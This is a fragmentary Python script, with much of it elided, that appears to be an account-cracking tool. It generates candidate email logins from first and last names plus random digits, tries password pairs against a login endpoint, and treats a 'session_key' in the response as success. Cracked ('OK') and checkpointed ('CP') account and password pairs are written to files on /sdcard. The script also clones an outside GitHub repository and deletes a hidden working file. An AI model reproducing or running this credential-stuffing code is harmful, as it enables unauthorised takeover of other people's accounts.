...
def NS_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/NISCHAL404-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' NS-code=NISCHAL404-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','NS-182^)Code=NISCHAL404-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .NISCHAL404')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.NISCHAL404','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.NISCHAL404','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.NISCHAL404', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/NISCHAL404-OK.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mNISCHAL404-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/NISCHAL404-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mNISCHAL404-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/NISCHAL404-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
